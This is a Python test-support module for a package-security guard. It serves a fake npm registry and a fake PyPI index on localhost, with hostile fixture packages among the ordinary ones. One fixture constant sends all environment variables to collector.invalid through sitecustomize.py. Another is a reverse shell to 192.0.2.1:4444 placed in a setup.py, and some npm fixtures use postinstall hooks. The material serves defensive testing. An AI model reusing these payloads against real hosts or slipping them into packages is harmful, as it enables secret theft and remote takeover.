"""Fake registries for the lazaret guard tests: an npm registry and a PyPI
simple index served on 127.0.0.1, with packages built in memory. Nothing here
is a test.

Every "hostile" payload is inert text (hosts are .invalid or 192.0.2.x), and
the tests never let a package manager run package code: npm and pnpm run with
scripts off, and a blocked package is never installed at all."""

import base64
import datetime
import hashlib
import http.server
import io
import json
import os
import socketserver
import subprocess
import sys
import tempfile
import threading
import urllib.parse
import zipfile

from tests import _support
from tests.registry._review_support import EXFIL_JS, tarball

NOW = datetime.datetime.now(datetime.timezone.utc)
OLD = NOW - datetime.timedelta(days=30)
FRESH = NOW - datetime.timedelta(hours=1)

ENV_TO_COLLECTOR_PY = ("import os, json, urllib.request\n"
                       "urllib.request.urlopen('https://collector.invalid/c', "
                       "data=json.dumps(dict(os.environ)).encode())\n")
REVERSE_SHELL_SETUP = ("import socket, os, subprocess\ns = socket.socket()\ns.connect(('192.0.2.1', 4444))\n"
                       "os.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nsubprocess.call(['/bin/sh', '-i'])\n"
                       "from setuptools import setup\nsetup(name='evil-sdist', version='1.0')\n")


def iso(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S.000Z")


def http_date(dt):
    return dt.strftime("%a, %d %b %Y %H:%M:%S GMT")


# ---------------- npm ----------------
def npm_package(name, version, deps=None, optional=None, scripts=None, files=None, os_=None, cpu=None):
    """A package's tarball bytes and its manifest (as the registry lists it)."""
    manifest = {"name": name, "version": version}
    if deps:
        manifest["dependencies"] = deps
    if optional:
        manifest["optionalDependencies"] = optional
    if scripts:
        manifest["scripts"] = scripts
    if os_:
        manifest["os"] = os_
    if cpu:
        manifest["cpu"] = cpu
    body = {"package.json": json.dumps(manifest, indent=2), "index.js": "module.exports = 1;\n"}
    body.update(files or {})
    data = tarball(body)
    return data, manifest


GOOD_JS = {"index.js": "module.exports = (a, b) => a + b;\n"}
EVIL_JS = {"install.js": EXFIL_JS}


def default_npm_packages():
    """name -> {version: (tarball, manifest, published)}."""
    pkgs = {}

    def add(name, version, published=OLD, **kw):
        data, manifest = npm_package(name, version, **kw)
        pkgs.setdefault(name, {})[version] = (data, manifest, published)

    add("good-pkg", "1.0.0", files=GOOD_JS)
    add("evil-pkg", "1.0.0", scripts={"postinstall": "node install.js"}, files=EVIL_JS)
    add("dep-parent", "1.0.0", deps={"evil-pkg": "^1.0.0"})
    add("fresh-pkg", "1.0.0")
    add("fresh-pkg", "1.1.0", published=FRESH)
    add("only-new", "1.0.0", published=FRESH)
    add("plat-parent", "1.0.0", optional={"plat-other": "1.0.0"})
    add("plat-other", "1.0.0", os_=["aix"], scripts={"postinstall": "node install.js"}, files=EVIL_JS)
    add("@scope/good", "2.0.0", files=GOOD_JS)
    return pkgs


class NpmRegistry:
    """An npm registry on 127.0.0.1: packuments (with `time`), version
    manifests and tarballs (with Last-Modified). `requests` records
    (user-agent, path) of every request, `authorizations` (user-agent, path,
    Authorization header). With `auth` (a whole Authorization header value)
    it answers 401 to a request without it: a private registry."""

    def __init__(self, packages=None, auth=None):
        self.packages = default_npm_packages() if packages is None else packages
        self.requests = []
        self.authorizations = []
        self.auth = auth
        registry = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def _send(self, code, body, ctype="application/json", headers=()):
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                for k, v in headers:
                    self.send_header(k, v)
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self):
                path = urllib.parse.unquote(urllib.parse.urlsplit(self.path).path).lstrip("/")
                registry.requests.append((self.headers.get("User-Agent", ""), path))
                registry.authorizations.append((self.headers.get("User-Agent", ""), path,
                                                self.headers.get("Authorization")))
                if registry.auth is not None and self.headers.get("Authorization") != registry.auth:
                    self._send(401, b'{"error": "authentication required"}',
                               headers=[("WWW-Authenticate", 'Basic realm="registry"')])
                    return
                if "/-/" in path:
                    name, _, file = path.partition("/-/")
                    for version, (data, _m, published) in registry.packages.get(name, {}).items():
                        if file == f"{name.rsplit('/', 1)[-1]}-{version}.tgz":
                            self._send(200, data, "application/octet-stream",
                                       [("Last-Modified", http_date(published))])
                            return
                    self._send(404, b"{}")
                    return
                if path in registry.packages:
                    self._send(200, json.dumps(registry.packument(path)).encode())
                    return
                name, _, version = path.rpartition("/")
                doc = registry.packument(name)["versions"].get(version) if name in registry.packages else None
                self._send(200 if doc else 404, json.dumps(doc or {}).encode())

        class Server(socketserver.ThreadingMixIn, http.server.HTTPServer):
            daemon_threads = True

        self.server = Server(("127.0.0.1", 0), Handler)
        self.url = f"http://127.0.0.1:{self.server.server_address[1]}/"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def integrity(self, name, version):
        data = self.packages[name][version][0]
        return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()

    def packument(self, name):
        versions, times = {}, {"created": iso(OLD), "modified": iso(NOW)}
        for version, (data, manifest, published) in self.packages[name].items():
            doc = dict(manifest)
            doc["dist"] = {"tarball": f"{self.url}{name}/-/{name.rsplit('/', 1)[-1]}-{version}.tgz",
                           "integrity": self.integrity(name, version),
                           "shasum": hashlib.sha1(data).hexdigest()}
            versions[version] = doc
            times[version] = iso(published)
        latest = max(versions, key=lambda v: tuple(int(x) for x in v.split(".")))
        return {"name": name, "dist-tags": {"latest": latest}, "versions": versions, "time": times}

    def guard_requests(self):
        return [p for ua, p in self.requests if ua.startswith("lazaret-guard")]

    def close(self):
        self.server.shutdown()
        self.server.server_close()


# ---------------- PyPI ----------------
def wheel(name, version, files, requires=(), scripts=None):
    """A pure-Python wheel: {path: text} plus its dist-info (scripts:
    {command: 'module:function'} console scripts)."""
    dist = f"{name.replace('-', '_')}-{version}.dist-info"
    body = dict(files)
    body[f"{dist}/METADATA"] = (f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n"
                                + "".join(f"Requires-Dist: {r}\n" for r in requires))
    if scripts:
        body[f"{dist}/entry_points.txt"] = "[console_scripts]\n" + "".join(f"{k} = {v}\n" for k, v in scripts.items())
    body[f"{dist}/WHEEL"] = "Wheel-Version: 1.0\nGenerator: lazaret-tests\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
    record = []
    for path, text in body.items():
        raw = text.encode()
        digest = base64.urlsafe_b64encode(hashlib.sha256(raw).digest()).rstrip(b"=").decode()
        record.append(f"{path},sha256={digest},{len(raw)}")
    record.append(f"{dist}/RECORD,,")
    body[f"{dist}/RECORD"] = "\n".join(record) + "\n"
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for path, text in body.items():
            zf.writestr(path, text)
    return f"{name.replace('-', '_')}-{version}-py3-none-any.whl", buf.getvalue()


def sdist(name, version, files):
    root = f"{name.replace('-', '_')}-{version}/"
    body = {"PKG-INFO": f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n"}
    body.update(files)
    return f"{name.replace('-', '_')}-{version}.tar.gz", tarball(body, root=root)


def default_pypi_files():
    """project -> [(filename, bytes, published)]."""
    out = {}

    def add(project, made, published=OLD):
        out.setdefault(project, []).append((made[0], made[1], published))

    add("good-py", wheel("good-py", "1.0", {"good_py/__init__.py": "VALUE = 1\n"}))
    add("evil-py", wheel("evil-py", "1.0", {"evil_py/__init__.py": "", "sitecustomize.py": ENV_TO_COLLECTOR_PY}))
    add("py-parent", wheel("py-parent", "1.0", {"py_parent/__init__.py": ""}, requires=["evil-py"]))
    add("fresh-py", wheel("fresh-py", "1.0", {"fresh_py/__init__.py": "V = 1\n"}))
    add("fresh-py", wheel("fresh-py", "1.1", {"fresh_py/__init__.py": "V = 2\n"}), published=FRESH)
    add("evil-sdist", sdist("evil-sdist", "1.0", {"setup.py": REVERSE_SHELL_SETUP}))
    # a command-line tool (uvx), and one whose dependency is evil
    add("good-tool", wheel("good-tool", "1.0", {"good_tool/__init__.py": "def main():\n    print('good-tool ran')\n"},
                           requires=["good-py"], scripts={"good-tool": "good_tool:main"}))
    add("evil-tool", wheel("evil-tool", "1.0", {"evil_tool/__init__.py": "def main():\n    print('evil-tool ran')\n"},
                           requires=["evil-py"], scripts={"evil-tool": "evil_tool:main"}))
    return out


class PypiIndex:
    """A PEP 691 (JSON) simple index on 127.0.0.1 and its files — or with
    html=True a PEP 503 one (HTML pages, no upload times); with `auth` (a
    whole Authorization header value) a private one, answering 401 without
    it. `requests` records (user-agent, path, Authorization header)."""

    def __init__(self, files=None, auth=None, html=False):
        self.files = default_pypi_files() if files is None else files
        self.requests = []
        self.auth = auth
        self.html = html
        index = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def _send(self, code, body, ctype):
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                if self.command != "HEAD":
                    self.wfile.write(body)

            def do_HEAD(self):
                self.do_GET()

            def do_GET(self):
                path = urllib.parse.unquote(urllib.parse.urlsplit(self.path).path)
                index.requests.append((self.headers.get("User-Agent", ""), path, self.headers.get("Authorization")))
                if index.auth is not None and self.headers.get("Authorization") != index.auth:
                    self.send_response(401)
                    self.send_header("WWW-Authenticate", 'Basic realm="index"')
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                parts = path.strip("/").split("/")
                if len(parts) == 2 and parts[0] == "simple" and parts[1] in index.files:
                    if index.html:
                        self._send(200, index.html_page(parts[1]).encode(), "text/html; charset=utf-8")
                    else:
                        self._send(200, json.dumps(index.page(parts[1])).encode(),
                                   "application/vnd.pypi.simple.v1+json")
                    return
                if len(parts) == 3 and parts[0] == "files":
                    for filename, data, _p in index.files.get(parts[1], []):
                        if filename == parts[2]:
                            self._send(200, data, "application/octet-stream")
                            return
                self._send(404, b"not found", "text/plain")

        class Server(socketserver.ThreadingMixIn, http.server.HTTPServer):
            daemon_threads = True

        self.server = Server(("127.0.0.1", 0), Handler)
        self.base = f"http://127.0.0.1:{self.server.server_address[1]}"
        self.url = self.base + "/simple/"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def page(self, project):
        files = [{"filename": fn, "url": f"{self.base}/files/{project}/{fn}",
                  "hashes": {"sha256": hashlib.sha256(data).hexdigest()}, "upload-time": iso(published),
                  "size": len(data)}
                 for fn, data, published in self.files[project]]
        return {"meta": {"api-version": "1.1"}, "name": project, "files": files}

    def html_page(self, project):
        rows = [f'<a href="../../files/{project}/{fn}#sha256={hashlib.sha256(data).hexdigest()}" '
                f'data-requires-python="&gt;=3.8">{fn}</a><br/>' for fn, data, _p in self.files[project]]
        return "<!DOCTYPE html><html><body>\n" + "\n".join(rows) + "\n</body></html>\n"

    def close(self):
        self.server.shutdown()
        self.server.server_close()


# ---------------- Running the guard ----------------
def base_env(tmp):
    """An environment for the guard and the tools it runs: its own caches,
    no user or global settings, nothing through a proxy, scripts off."""
    env = {k: v for k, v in os.environ.items()
           if not k.lower().startswith(("npm_config_", "pnpm_", "pip_", "uv_", "lazaret_guard", "virtual_env"))}
    env.update({
        "PYTHONPATH": _support.SRC + os.pathsep + _support.PY_ROOT,
        "LAZARET_GUARD_CACHE": os.path.join(tmp, "guard-cache.json"),
        # (the guard's own folders for a tool's plan: the test's, which is private to the run, rather than ~/.cache's)
        "LAZARET_GUARD_SCRATCH": os.path.join(tmp, "guard-scratch"),
        "NO_PROXY": "127.0.0.1,localhost", "no_proxy": "127.0.0.1,localhost",
        "npm_config_userconfig": os.path.join(tmp, "npmrc-user"),
        "npm_config_globalconfig": os.path.join(tmp, "npmrc-global"),
        "npm_config_cache": os.path.join(tmp, "npm-cache"), "npm_config_store_dir": os.path.join(tmp, "pnpm-store"),
        "npm_config_ignore_scripts": "true", "npm_config_audit": "false", "npm_config_fund": "false",
        "npm_config_update_notifier": "false", "npm_config_noproxy": "127.0.0.1,localhost",
        "npm_config_fetch_retries": "0", "npm_config_loglevel": "error",
        "PIP_CONFIG_FILE": os.devnull, "PIP_DISABLE_PIP_VERSION_CHECK": "1", "PIP_NO_CACHE_DIR": "1",
        "UV_CACHE_DIR": os.path.join(tmp, "uv-cache"), "UV_NO_CONFIG": "1", "UV_PYTHON_DOWNLOADS": "never",
        "UV_NO_PROGRESS": "1",
        "XDG_CONFIG_HOME": os.path.join(tmp, "xdg-config"),
    })
    return env


def run_guard(args, cwd, env, timeout=40):
    """python -m lazaret.registry.guard <args> -> (exit code, output)."""
    proc = subprocess.run([sys.executable, "-m", "lazaret.registry.guard", *args], cwd=cwd, env=env,
                          capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=timeout)
    return proc.returncode, proc.stdout + proc.stderr


def project(tmp, name="proj", manifest=None):
    """A fresh folder with a package.json."""
    d = tempfile.mkdtemp(prefix=name + "-", dir=tmp)
    with open(os.path.join(d, "package.json"), "w", encoding="utf-8") as f:
        json.dump(manifest or {"name": name, "version": "1.0.0", "private": True}, f)
    return d


def read(path):
    try:
        with open(path, encoding="utf-8") as f:
            return f.read()
    except OSError:
        return None
